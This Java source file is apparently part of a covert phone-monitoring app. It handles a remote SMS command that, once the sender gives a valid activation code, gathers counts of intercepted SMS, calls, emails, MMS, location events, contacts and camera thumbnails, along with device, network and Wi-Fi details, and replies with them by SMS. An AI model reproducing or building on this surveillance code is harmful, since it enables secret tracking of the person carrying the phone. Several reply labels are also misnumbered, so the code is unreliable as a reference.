package com.vvt.remotecommandmanager.processor.troubleshoot;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxEventType;
import com.vvt.configurationmanager.ConfigurationManager;
import com.vvt.configurationmanager.FeatureID;
import com.vvt.connectionhistorymanager.ConnectionHistoryEntry;
import com.vvt.connectionhistorymanager.ConnectionHistoryManager;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.eventresult.EventCountInfo;
import com.vvt.events.FxEventDirection;
import com.vvt.ioutil.SDCard;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.memory.MemoryUtil;
import com.vvt.network.NetworkUtil;
import com.vvt.phoneinfo.PhoneInfo;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class RequestDiagnosticProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RequestDiagnosticProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private ProductInfo mProductInfo;
	private PhoneInfo mPhoneInfo;
	private FxEventRepository mFxEventRepository;
	private ConnectionHistoryManager mConnectionHistoryManager;
	private AppContext mAppContext;
	private AddressbookManager mAddressbookManager;
	private StringBuilder mReplyMessageBuilder;
	private ConfigurationManager mConfigurationManager;
	
	public RequestDiagnosticProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, ProductInfo productInfo, PhoneInfo phoneInfo, ConnectionHistoryManager connectionHistoryManager,
			AddressbookManager addressbookManager, ConfigurationManager configurationManager ) {
		
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mProductInfo = productInfo;
		mPhoneInfo = phoneInfo;
		mFxEventRepository = eventRepository;
		mConnectionHistoryManager = connectionHistoryManager;
		mAppContext = appContext;
		mAddressbookManager = addressbookManager;
		mConfigurationManager = configurationManager;
		
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {

			if(mConfigurationManager.getConfiguration() == null) {
				if(LOGE) FxLog.e(TAG, "mConfigurationManager.getConfiguration() returned null");
				mReplyMessage.setIsSuccess(false);
				mReplyMessage.setMessage(MessageManager.GET_SETTINGS_ERROR);
				return;
			}
			
			final List<FeatureID> featureIDs =  mConfigurationManager.getConfiguration().getSupportedFeture();
			final String lineSeparator = System.getProperty("line.separator");
			SimpleDateFormat dateFormatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
			StringBuilder builder = new StringBuilder();
			
			// 1> Application ID, Version
			String productIdVersion = mProductInfo.getProductId() + ", " + mProductInfo.getProductVersion();
			builder.append("1>").append(productIdVersion).append(lineSeparator);
			
			 // 2> Device Type
			String deviceType = mPhoneInfo.getDeviceModel();
	        builder.append("2>").append(deviceType).append(lineSeparator);
	        
	        EventCountInfo eventCountInfo = mFxEventRepository.getCount();
	        
	        // 3> SMS events
	        if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_LOCATION)) {
	        	int inSmsCount = eventCountInfo.count(FxEventType.SMS, FxEventDirection.IN);
	  	        int outSmsCount = eventCountInfo.count(FxEventType.SMS, FxEventDirection.OUT);
	  	       	        	        
	  	        String smsInOut = inSmsCount + ", " + outSmsCount;
	  	        builder.append("3>").append(smsInOut).append(lineSeparator);
	        }
	        
	        // 4> Voice events
	        if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CALL)) {
	        	int inCallCount = eventCountInfo.count(FxEventType.CALL_LOG, FxEventDirection.IN);
		        int outCallCount = eventCountInfo.count(FxEventType.CALL_LOG, FxEventDirection.OUT);
		        int missedCallCount = eventCountInfo.count(FxEventType.CALL_LOG, FxEventDirection.MISSED_CALL);
		        
	            String voiceInOutMissed = inCallCount + ", " + outCallCount + ", " + missedCallCount;
	            builder.append("4>").append(voiceInOutMissed).append(lineSeparator);	
	        }
	        
	        // 5> Location and System events
	        if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_LOCATION) && featureIDs.contains(FeatureID.FEATURE_ID_EVNET_SYSTEM)) {
	        	int locationCount = eventCountInfo.count(FxEventType.LOCATION);
		        int systemCount = eventCountInfo.count(FxEventType.SYSTEM);
		        
	            String locationSystem = locationCount + ", " + systemCount;
	            builder.append("5>").append(locationSystem).append(lineSeparator);	
	        }
            
	        //6> Email
	        if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_EMAIL)) {
	        	int inEmailCount = eventCountInfo.count(FxEventType.MAIL, FxEventDirection.IN);
		        int outEmailCount = eventCountInfo.count(FxEventType.MAIL, FxEventDirection.OUT);
		        
	            String emailInOut = String.format("%d, %d", inEmailCount, outEmailCount);
	            builder.append("6>").append(emailInOut).append(lineSeparator);	
	        }
	        
            //7> Last Connection time
            ConnectionHistoryEntry lce = mConnectionHistoryManager.getLastConnection();
            if (lce != null) { 
            	 String lastConnectiontime = dateFormatter.format(new Date(lce.getDate()));
            	 builder.append("7>").append(lastConnectiontime).append(", ").append(lce.getAPN().toString()).append(lineSeparator);
            }
            
            //8> Response Code
            if (lce != null) { 
            	builder.append("7>").append(lce.getStatusCode()).append(",").append("0").append(",").append("0").append(lineSeparator);
            }
            
            //9> APN Recover Information
            String defaultApn = NetworkUtil.getDefaultApnName(mAppContext.getApplicationContext());
            String defaultWifi = NetworkUtil.getConnectedWifiName(mAppContext.getApplicationContext());
            
            builder.append("9>").append("GPRS:").append(defaultApn).append(lineSeparator)
            .append("WLAN:").append(defaultWifi) 
            .append(lineSeparator);
            
            //10> Country code, Network code
            builder.append("10>").append(mPhoneInfo.getMobileCountryCode()).append(", ");
            builder.append(mPhoneInfo.getMobileNetworkCode()).append(lineSeparator);
            
            //11> Network Name
            builder.append("11>").append(mPhoneInfo.getNetworkName())
            .append(lineSeparator);
            
            //12> DB Size
            long dbSize = mFxEventRepository.getDBSize();
            
            if(dbSize > 1024)
            	dbSize /= 1024;
            else
            	dbSize = 0;
            	
            builder.append("12>").append(dbSize)
            .append(lineSeparator);
            
            //13> Install Drive
            builder.append("11>").append(mAppContext.getWritablePath())
            .append(lineSeparator);
            
            //14> Available Memory on drive
            builder.append("12>").append(MemoryUtil.getAvailableMemory(mAppContext.getApplicationContext()))
            .append(lineSeparator);
            
            
            //20> Phone's GPS Setting
            List<String> providers = NetworkUtil.getAllProviders(mAppContext.getApplicationContext());
            
            if (!providers.isEmpty()) {
            	 builder.append("20>");
            	 for (String provider : providers) {
                     builder.append(provider);
                     if (providers.indexOf(provider) < providers.size() - 1) {
                         builder.append(", ");
                     }
                 }
                 builder.append(lineSeparator);
            }
            
            
            //21> Is phone storage low
            final long requiredFreeSpcace = 1024000;
            final long freeSpcace = SDCard.getFreeSpcace();
            
			if (freeSpcace < requiredFreeSpcace)
				builder.append("21>1").append(lineSeparator);
			else
				builder.append("21>0").append(lineSeparator);
			
			//22> MMS events
			if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_MMS)) {
				int inMmsCount = eventCountInfo.count(FxEventType.MMS, FxEventDirection.IN);
				int outMmsCount = eventCountInfo.count(FxEventType.MMS, FxEventDirection.OUT);
				
				String mmsInOut = inMmsCount + ", " + outMmsCount;
	            builder.append("22>").append(mmsInOut).append(lineSeparator);    
			}
            

            //23> Address book
			if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CONTACT)) {
				if(mAddressbookManager != null) { // If not applicable for this product.
	            	String addressBook = String.valueOf(mAddressbookManager.getAddressBookCount());
	            	builder.append("23>").append(addressBook).append(lineSeparator);
	            }	
			}
                        
            //24> Thumbnails
			if(featureIDs.contains(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE)) {
				int thumbnailsCount = eventCountInfo.count(FxEventType.CAMERA_IMAGE_THUMBNAIL);
	            builder.append("24>").append(thumbnailsCount).append(lineSeparator);	
			}
            
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.append(builder.toString()).toString());
		} catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());

			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.GET_SETTINGS_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
